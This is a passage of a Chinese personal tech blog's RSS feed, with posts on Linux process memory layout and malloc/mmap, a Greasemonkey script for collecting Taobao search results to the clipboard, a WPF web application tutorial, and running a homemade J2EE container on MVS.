            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">printf</span><span style="font-size: 10pt; color: black;" lang="EN-US">(</span><span style="font-size: 10pt; color: rgb(0, 0, 119);" lang="EN-US">"main=%p print=%p\n"</span><span style="font-size: 10pt; color: black;" lang="EN-US">, </span><span style="font-size: 10pt; color: gray;" lang="EN-US">main</span><span style="font-size: 10pt; color: black;" lang="EN-US">, </span><span style="font-size: 10pt; color: gray;" lang="EN-US">printf</span><span style="font-size: 10pt; color: black;" lang="EN-US">);</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">printf</span><span style="font-size: 10pt; color: black;" lang="EN-US">(</span><span style="font-size: 10pt; color: rgb(0, 0, 119);" lang="EN-US">"first=%p\n"</span><span style="font-size: 10pt; color: black;" lang="EN-US">, &amp;</span><span style="font-size: 10pt; color: gray;" lang="EN-US">first</span><span style="font-size: 10pt; color: black;" lang="EN-US">);</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">printf</span><span style="font-size: 10pt; color: black;" lang="EN-US">(</span><span style="font-size: 10pt; color: rgb(0, 0, 119);" lang="EN-US">"p0=%p p1=%p p2=%p p3=%p\n"</span><span style="font-size: 10pt; color: black;" lang="EN-US">, </span><span style="font-size: 10pt; color: gray;" lang="EN-US">p0</span><span style="font-size: 10pt; color: black;" lang="EN-US">, </span><span style="font-size: 10pt; color: gray;" lang="EN-US">p1</span><span style="font-size: 10pt; color: black;" lang="EN-US">, </span><span style="font-size: 10pt; color: gray;" lang="EN-US">p2</span><span style="font-size: 10pt; color: black;" lang="EN-US">, </span><span style="font-size: 10pt; color: gray;" lang="EN-US">p3</span><span style="font-size: 10pt; color: black;" lang="EN-US">);</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><span style="font-size: 10pt; color: black;" lang="EN-US"><font face="Times New Roman">&nbsp;</font></span></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: rgb(136, 0, 0);" lang="EN-US">getchar</span><span style="font-size: 10pt; color: black;" lang="EN-US">();</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><span style="font-size: 10pt; color: black;" lang="EN-US"><font face="Times New Roman">&nbsp;</font></span></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><span style="font-size: 10pt; color: black;" lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span><span style="font-size: 10pt; color: blue;" lang="EN-US">return</span><span style="font-size: 10pt; color: black;" lang="EN-US"> 0;</span></font></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><span style="font-size: 10pt; color: black;" lang="EN-US"><font face="Times New Roman">}</font></span></p>
            <p  style="margin: 0cm 0cm 0pt; text-align: left;" align="left"><font face="Times New Roman"><font size="3">&nbsp;<span lang="EN-US"></span></font></font></p>
            </td>
        </tr>
    </tbody>
</table>
<p  style="margin: 0cm 0cm 0pt;"><span style="font-family: 宋体;"><font face="Times New Roman"><font size="3"><font size="3">运行后，输出结果为：</font></font></font></span></p>
<p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3"><em><span lang="EN-US"><font face="Times New Roman"><font size="3">main=0x8048404 print=0x8048324</font></font></span></em></font></font></p>
<p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3"><em><span lang="EN-US"><font face="Times New Roman"><font size="3">first=0xbfcd1264</font></font></span></em></font></font></p>
<p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3"><em><span lang="EN-US"><font face="Times New Roman"><font size="3">p0=0x9253008 p1=0xb7ec0008 p2=0x97ebf008 p3=0x57ebe008</font></font></span></em></font></font></p>
<p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman"><font size="3"><font face="Times New Roman"><font size="3">&nbsp;</font></font></font></font></span></p>
<p  style="margin: 0cm 0cm 0pt 21pt; text-indent: -21pt;"><span style="font-family: Wingdings;" lang="EN-US"><font face="Times New Roman"><font size="3"><font size="3">l</font><span style="font-family: &quot;Times New Roman&quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></font></font></span><font face="Times New Roman"><font size="3"><font size="3"><span lang="EN-US"><font face="Times New Roman">main</font></span><span style="font-family: 宋体;">和</span><span lang="EN-US"><font face="Times New Roman">print</font></span><span style="font-family: 宋体;">两个函数是代码段</span><span lang="EN-US"><font face="Times New Roman">(.text)</font></span><span style="font-family: 宋体;">的，其地址符合表一的描述。</span></font></font></font></p>
<p  style="margin: 0cm 0cm 0pt 21pt; text-indent: -21pt;"><span style="font-family: Wingdings;" lang="EN-US"><font face="Times New Roman"><font size="3"><font size="3">l</font><span style="font-family: &quot;Times New Roman&quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></font></font></span><font face="Times New Roman"><font size="3"><font size="3"><span lang="EN-US"><font face="Times New Roman">first</font></span><span style="font-family: 宋体;">是第一个临时变量，由于在</span><span lang="EN-US"><font face="Times New Roman">first</font></span><span style="font-family: 宋体;">之前还有一些环境变量，它的值并非</span><span lang="EN-US"><font face="Times New Roman">0xbfffffff</font></span><span style="font-family: 宋体;">，而是</span><span lang="EN-US"><font face="Times New Roman">0xbfcd1264</font></span><span style="font-family: 宋体;">，这是正常的。</span></font></font></font></p>
<p  style="margin: 0cm 0cm 0pt 21pt; text-indent: -21pt;"><span style="font-family: Wingdings;" lang="EN-US"><font face="Times New Roman"><font size="3"><font size="3">l</font><span style="font-family: &quot;Times New Roman&quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></font></font></span><font face="Times New Roman"><font size="3"><font size="3"><span lang="EN-US"><font face="Times New Roman">p0</font></span><span style="font-family: 宋体;">是在堆中分配的，其地址小于</span><span lang="EN-US"><font face="Times New Roman">0x4000 0000</font></span><span style="font-family: 宋体;">，这也是正常的。</span></font></font></font></p>
<p  style="margin: 0cm 0cm 0pt 21pt; text-indent: -21pt;"><span style="font-family: Wingdings;" lang="EN-US"><font face="Times New Roman"><font size="3"><font size="3">l</font><span style="font-family: &quot;Times New Roman&quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></font></font></span><font face="Times New Roman"><font size="3"><font size="3"><span style="font-family: 宋体;">但</span><span lang="EN-US"><font face="Times New Roman">p1</font></span><span style="font-family: 宋体;">和</span><span lang="EN-US"><font face="Times New Roman">p2</font></span><span style="font-family: 宋体;">也是在堆中分配的，而其地址竟大于</span><span lang="EN-US"><font face="Times New Roman">0x4000 0000</font></span><span style="font-family: 宋体;">，与表一描述不符。</span></font></font></font></p>
<p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman"><font size="3"><font face="Times New Roman"><font size="3">&nbsp;</font></font></font></font></span></p>
<p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3"><font size="3"><span style="font-family: 宋体;">原因在于：运行时堆的位置与内存管理算法相关，也就是与</span><span lang="EN-US"><font face="Times New Roman">malloc</font></span><span style="font-family: 宋体;">的实现相关。关于内存管理算法的问题，我们在后继文章中有详细描述，这里只作简要说明。在</span><span lang="EN-US"><font face="Times New Roman">glibc</font></span><span style="font-family: 宋体;">实现的内存管理算法中，</span><span lang="EN-US"><font face="Times New Roman">Malloc</font></span><span style="font-family: 宋体;">小块内存是在小于</span><span lang="EN-US"><font face="Times New Roman">0x4000 0000</font></span><span style="font-family: 宋体;">的内存中分配的，通过</span><span lang="EN-US"><font face="Times New Roman">brk/sbrk</font></span><span style="font-family: 宋体;">不断向上扩展，而分配大块内存，</span><span lang="EN-US"><font face="Times New Roman">malloc</font></span><span style="font-family: 宋体;">直接通过系统调用</span><span lang="EN-US"><font face="Times New Roman">mmap</font></span><span style="font-family: 宋体;">实现，分配得到的地址在文件映射区，所以其地址大于</span><span lang="EN-US"><font face="Times New Roman">0x4000 0000</font></span><span style="font-family: 宋体;">。</span></font></font></font></p>
<p  style="margin: 0cm 0cm 0pt;"><span lang="EN-US"><font face="Times New Roman"><font size="3"><font face="Times New Roman"><font size="3">&nbsp;</font></font></font></font></span></p>
<p  style="margin: 0cm 0cm 0pt;"><font face="Times New Roman"><font size="3"><font size="3"><span style="font-family: 宋体;">从</span><span lang="EN-US"><font face="Times New Roman">maps</font></span><span style="font-family: 宋体;">文件中可以清楚的看到一点：</span></font></font></font></p></span>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008102102741205/</guid>
    </item>
    <item>
      <title>
<![CDATA[淘宝的GreaseMonkey脚本]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720097192830521/</link>
      <description>
<![CDATA[在淘宝上搜索到的宝贝列表，为了把一些自己比较感兴趣的结果记录下来，则不停的复制粘贴，使用这个脚本，可以在每个宝贝的旁边显示一个添加按钮，点击后自动添加到最后面的空白，最后点复制，把所有的结果复制到剪贴板，还是比较方便实用的。<br>添加完成后添加按钮自动隐藏，点击复制按钮则会将内容复制到系统剪贴板，按清空按钮则删除添加的内容，并重新显示出隐藏的添加按钮<br><a href="http://img.bimg.126.net/photo/gB7zBGJGywneZSGylJHl4g==/4860228422863881464.jpg" target="_blank"><img title="淘宝的GreaseMonkey脚本 - hankjin - 乱-Blog" alt="淘宝的GreaseMonkey脚本 - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/gB7zBGJGywneZSGylJHl4g==/4860228422863881464.jpg"></a><br>需要安装FireFox+GreaseMonkey插件。https://addons.mozilla.org/en-US/firefox/addon/748<br>然后把下面的文件保存为taobaonote.user.js，然后直接用鼠标拖到Firefox中。<br><br>// ==UserScript==<br>// @name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; taobaoNote<br>// @namespace&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http://ysmonk.appspot.com/<br>// @include&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http://search1.taobao.com/*<br>// ==/UserScript==<br><br>var products=document.getElementById('list:content').childNodes[1].childNodes[3] //获得产品信息区块<br>var items=products.childNodes&nbsp; //产品信息列表<br><br>var note=document.createElement('pre') //添加要收藏的区块<br>note.id="hjz";<br>products.parentNode.insertBefore(note,products.nextSibling)<br><br>var tool=document.createElement('a') //添加复制按钮<br>tool.id='hjzfinal';<br>tool.innerHTML='复制';<br>tool.href='javas<wbr>cript:void(0);';<br>tool.setAttribute("on<wbr>click","javas<wbr>cript:var txt=document.getElementById('hjz').innerHTML;try{&nbsp;&nbsp; &nbsp;netscape.security.PrivilegeManager.enablePrivilege('UniversalXPConnect');&nbsp; }catch (e) {&nbsp;&nbsp; &nbsp;alert('Your firefox Security deny Copy &amp; Paste, Please open about:config, and set signed.applets.codebase_principal_support to true and retry');}var clip = Components.classes['@mozilla.org/widget/clipboard;1'].createInstance(Components.interfaces.nsIClipboard);&nbsp;&nbsp; if (clip){&nbsp;&nbsp; &nbsp;var trans = Components.classes['@mozilla.org/widget/transferable;1'].createInstance(Components.interfaces.nsITransferable);&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (trans)&nbsp;&nbsp; {&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;trans.addDataFlavor('text/unicode');&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var str = new Object();&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var len = new Object();&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var str = Components.classes['@mozilla.org/supports-string;1'].createInstance(Components.interfaces.nsISupportsString);&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var copytext = txt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;str.da<wbr>ta = copytext;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;trans.setTransferData('text/unicode',str,copytext.length*2);&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var clipid = Components.interfaces.nsIClipboard;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (clip)&nbsp;&nbsp; {&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;clip.setData(trans,null,clipid.kGlobalClipboard);&nbsp;&nbsp; alert('已成功复制到剪贴板')&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}&nbsp;&nbsp; &nbsp;}};");<br>note.parentNode.insertBefore(tool,note);<br><br>var sep=document.createElement('span')//分割<br>sep.innerHTML='&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'<br>note.parentNode.insertBefore(sep,note);<br><br>var clear=document.createElement('a') //添加清空按钮<br>clear.id='hjzclear';<br>clear.innerHTML='清空';<br>clear.href='javas<wbr>cript:void(0);';<br>clear.setAttribute("on<wbr>click","javas<wbr>cript:if(confirm('are you sure?')){document.getElementById('hjz').innerHTML='';var items=document.getElementById('list:content').childNodes[1].childNodes[3].childNodes;for(var i=1;i&lt;items.length;i+=2){items[i].childNodes[13].style.display='block'};}");<br>note.parentNode.insertBefore(clear,note);<br><br><br>for (var i = 1; i &lt; items.length; i+=2) {//添加增加按钮<br>&nbsp;&nbsp; &nbsp;name=items[i].childNodes[1].childNodes[0].innerHTML;//&lt;h3&gt;&lt;a&gt;xx&lt;/a&gt;&lt;/h3&gt;<br>&nbsp;&nbsp; &nbsp;price=items[i].childNodes[5].childNodes[7].childNodes[1].innerHTML;//价格&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp; &nbsp;var add=document.createElement('a');<br>&nbsp;&nbsp; &nbsp;add.innerHTML='添加';<br>&nbsp;&nbsp; &nbsp;add.href='javas<wbr>cript:void(0);';<br>&nbsp;&nbsp; &nbsp;add.setAttribute("on<wbr>click","javas<wbr>cript:this.style.display='none';document.getElementById('hjz').innerHTML+='"+name+"\\t"+price+"\\n';");<br>&nbsp;&nbsp; &nbsp;items[i].insertBefore(add,items[i].lastChild.nextSibling);<br>}<br>/**<br>s[1].innerHTML<br>&lt;a href="http://item.taobao.com/auction/item_detail-0db1-f45da956827a1b7e65160097366180d2.jhtml?cm_cat=0" target="_blank" on<wbr>click="return beacon('0db1-f45da956827a1b7e65160097366180d2')" class="EventCanSelect"&gt;武汉手机号码手机卡移动手机号码手机靓号全部靓号清单&lt;/a&gt;<br>s[3].innerHTML<br>&lt;a href="http://item.taobao.com/auction/item_detail-0db1-f45da956827a1b7e65160097366180d2.jhtml?cm_cat=0" target="_blank" on<wbr>click="return beacon('0db1-f45da956827a1b7e65160097366180d2')"&gt;&lt;span&gt;&lt;img alt="" src="http://img04.taobaocdn.com/bao/uploaded/i4/T1wGJXXatXTZxmP8YX_085952.jpg_sum.jpg" class="hesper:small2big"&gt;&lt;/span&gt;&lt;/a&gt;<br>s[5].innerHTML<br>&lt;li class="place"&gt;湖北武汉&lt;/li&gt;<br>&lt;li class="shipping"&gt; 0.00 &lt;/li&gt;<br>&lt;li class="legend2"&gt; <br>&nbsp;&nbsp; &nbsp;&lt;a href="http://www.taobao.com/go/act/315/xfzbz_rsms.php?ad_id=&amp;amp;am_id=130011830696bce9eda3&amp;amp;cm_id=&amp;amp;pm_id=&amp;amp;xbjc=1.1" class="xb-as-fact" title="消费者保障服务，卖家承诺商品如实描述" target="_blank"&gt;&lt;span&gt;如实描述&lt;/span&gt;&lt;/a&gt; &lt;/li&gt;<br>&nbsp;&nbsp; &nbsp;&lt;li class="price"&gt; 一口价 &lt;em&gt;100.00&lt;/em&gt; &lt;div&gt; &lt;p&gt; &lt;/p&gt; &lt;/div&gt;<br>&lt;/li&gt;<br>s[7].innerHTML<br>s[9].innerHTML<br>卖家：&lt;a href="http://store.taobao.com/shop/view_shop-3e8ab3728560316d35a954b793b4649a.htm?ssid=r11" target="_blank"&gt;zhangguanghua&lt;/a&gt; &lt;span class="ww:token" ww:params="nick=zhangguanghua&amp;amp;tnick=zhangguanghua&amp;amp;item=f45da956827a1b7e65160097366180d2&amp;amp;display=inline"&gt;&lt;a title="点此可以直接和卖家交流选好的宝贝，或相互交流网购体验，还支持语音视频噢。" class="ww-on<wbr>line ww-large ww-inline" target="_blank" href="http://webwwtb.im.alisoft.com/wangwang/ww1.htm?t=1250661076244&amp; amp;amp;uid=&amp;amp;tid=zhangguanghua"&gt;&lt;span&gt;旺旺在线&lt;/span&amp; gt;&lt;/a&gt;&lt;/span&gt;<br>s[11].innerHTML<br>&lt;input name="auction_id" value="f45da956827a1b7e65160097366180d2_{0db1}" type="checkbox"&gt; <br>*/]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720097192830521/</guid>
    </item>
    <item>
      <title>
<![CDATA[在VS2008.Net下使用WPF开发Web应用程序]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200922353623434/</link>
      <description>
<![CDATA[胖客户端的好处是可以轻易的实现绚丽的效果, 而瘦客户端则需要大量的js才能实现相应的效果. <br>而且当需要同时开发应用程序和Web应用程序时, 则需要将近双倍的开发时间.<br>但是,在VS2008.Net下使用WPF技术, 则不但可以轻松地在Web上实现应用程序的效果, 而且可以很简单的将应用程序转换成Web应用程序.<br>1. 新建-&gt;项目-&gt;WPF Web Application<br>2. 修改Page1.xaml<br>&lt;Page x:Class="WPFWebTest.Page1"<br>&nbsp;&nbsp;&nbsp; xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"<br>&nbsp;&nbsp;&nbsp; xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"<br>&nbsp;&nbsp;&nbsp; Title="Page1"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;Grid&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;StackPanel&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;TextBox Name="tbName"/&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;Button Name="btnWelcome" Click="btnWelcome_Click" Content="Hi"/&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;Label Name="lblWelcome"/&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;/StackPanel&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/Grid&gt;<br>&lt;/Page&gt;<br>3. 修改Page1.xaml.cs<br>&nbsp;&nbsp;&nbsp; public partial class Page1 : Page<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; public Page1()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; InitializeComponent();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; private void btnWelcome_Click(object sender, RoutedEventArgs e)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; lblWelcome.Content = "Welcome " + tbName.Text;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>3. Build-&gt;Publish<br>注意, 只能使用IE浏览器.<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200922353623434/</guid>
    </item>
    <item>
      <title>
<![CDATA[在MVS上运行自己的J2EE容器]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007112711214993/</link>
      <description>
<![CDATA[<P>步骤：</P>  <P>1。安装并配置JZOS，从IBM网站上下载JZOS，并按照说明安装配置</P>  <P>2。上传serverv1.3.2.zip到MVS上 &gt;ftp server.com &gt;bin &gt;put serverv1.3.2.zip</P>  <P>&nbsp; serverv1.3.2.zip在网络硬盘中</P>  <P>3。在USS上解压缩serverv1.3.2.zip，使用命令jar xf serverv1.3.2.zip</P>  <P>4。在USS上编译 &gt;javac -encoding ascii -d ../ lib/*.java &gt;javac -encoding ascii -d ../ apps/*.java</P>  <P>5。在MVS上使用JZOS和一个JCL(附1)启动MVS，提交后的log(附2)</P>  <P>6。使用浏览器访问 <A rel="nofollow" href="http://&lt;server&gt;:&lt;port&gt;/apps.HelloHttpService"  >http://&lt;server&gt;:&lt;port&gt;/apps.HelloHttpService</A>&nbsp;，如果页面正常现实则表示成功。</P>  <P>附1。</P>  <P>//CNTESTDE JOB MYJ2EESRV,HJZ,MSGCLASS=H,NOTIFY=&amp;SYSUID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//PROCLIB JCLLIB ORDER=&amp;SYSUID..JZOS.SAMPJCL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//*********************************************************************<BR>//*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//* Batch job to run a simple J2EE Container written by hankjin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//* version: 1.3.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//* Tailor the proc and job for your installation:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//* 1.) Modify the Job card per your installation's requirements&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//* 2.) Modify the PROCLIB card to point to JZOS proclib&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//* 3.) Set VERSION='14' for Java 1.4 or VERSION='50' for Java 5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//* 4.) Set JAVA_HOME to point the location of the Java SDK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//* 5.) Set CLASSPATH to point to the simple j2ee container class dir&nbsp; <BR>//* 6.) Modify the ARGS to use a usable port number&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//*********************************************************************<BR>//*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//JAVA EXEC PROC=EXJZOSVM,VERSION='14',&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</P>  <P>// JAVACLS='lib.WebServer',&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>// 